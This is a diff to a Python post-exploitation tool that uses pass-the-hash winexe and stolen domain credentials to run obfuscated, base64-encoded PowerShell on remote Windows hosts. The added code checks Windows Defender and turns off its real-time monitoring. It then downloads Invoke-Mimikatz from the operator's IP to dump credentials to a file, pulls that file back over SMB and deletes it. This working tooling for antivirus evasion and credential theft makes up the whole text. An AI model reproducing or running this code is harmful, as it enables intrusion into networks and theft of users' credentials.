@@ -500,7 +500,40 @@ def datadump(user, passw, host, path, os_version):
 					server_process.start()	
 					
 					x=' '
-					line = "iEx ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('h'+'t'+'t'+'p'+'://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/a'));"+randint(1,50)*x+"Invoke-Mimikatz"+randint(1,50)*x+" -DumpCreds > c:\\creds.txt"
+					
+					if "Windows 10.0" in os_version:
+						print colored("[+]Getting Windows Defender Status",'yellow')
+						line="Get-MpPreference | fl DisableRealtimeMonitoring"
+						en = b64encode(line.encode('UTF-16LE'))						
+						
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+						stdout_value = proc.communicate()[0]
+						if "DisableRealtimeMonitoring : False" in stdout_value:
+							print colored("[+]Windows Defender RealTimeMonitoring Turned On",'yellow')
+							AVstatus='On'
+						else:
+							print colored("[+]Windows Defender RealTimeMonitoring Turned Off",'yellow')
+							AVstatus='Off'
+
+					if "Windows 10.0" in os_version:
+												
+						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+						stdout_value = proc.communicate()[0]
+						if "UseLogonCredential    REG_DWORD    0x0" in stdout_value:
+							print colored("[-]It looks like the reg value UseLogonCredential is set to 0 - so no cleartext credentials will be available use the -rW e/d/q parameter",'green')
+						else:
+							print colored("[+]UseLogonCredential Registry Value is set to 1 - so cleartext credentials will be hopefully be available",'green')
+
+						if AVstatus=='On':
+							print colored("[+]Turning Off Temporarily on Windows Defender Realtime Monitoring...",'blue')
+							line="Set-MpPreference -DisableRealtimeMonitoring $true\n"
+							en = b64encode(line.encode('UTF-16LE'))						
+							os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+						
+						line = "iex ((New-Object System.Net.WebClient).DownloadString('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/a'));"+randint(1,50)*x+"Invoke-Mimikatz"+randint(1,50)*x+" -DumpCreds > c:\\creds.txt"
+					else:
+						line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/a'));"+randint(1,50)*x+"Invoke-Mimikatz"+randint(1,50)*x+" -DumpCreds > c:\\creds.txt"
+					
 					print colored("Using: "+line,'yellow')
 					en = b64encode(line.encode('UTF-16LE'))
 					print colored("Encoding command: "+en,'yellow')
@@ -508,6 +541,14 @@ def datadump(user, passw, host, path, os_version):
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
 					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get creds.txt\' 2>/dev/null")
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\creds.txt\" 2>/dev/null")
+					
+					if "Windows 10.0" in os_version:
+						if AVstatus=='On':
+							print colored("[+]Turning Back on Windows Defender Realtime Monitoring...",'blue')
+							line="Set-MpPreference -DisableRealtimeMonitoring $false\n"
+							en = b64encode(line.encode('UTF-16LE'))						
+							os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+
 					if os.path.isfile(outputpath+host+"/creds.txt"):
 						print colored("[+]creds.txt file found",'green')
 						if not os.path.isfile('/usr/bin/iconv'):
